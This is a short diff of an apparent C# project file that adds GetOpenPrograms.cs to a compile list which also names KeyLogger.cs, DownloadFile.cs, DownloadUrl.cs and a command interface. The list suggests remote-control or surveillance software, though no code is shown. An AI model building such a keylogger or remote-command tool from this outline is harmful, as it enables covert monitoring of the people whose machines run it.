@@ -55,6 +55,7 @@
     <Compile Include="DownloadFile.cs" />
     <Compile Include="DownloadUrl.cs" />
     <Compile Include="Exit.cs" />
+    <Compile Include="GetOpenPrograms.cs" />
     <Compile Include="ICommand.cs" />
     <Compile Include="KeyLogger.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
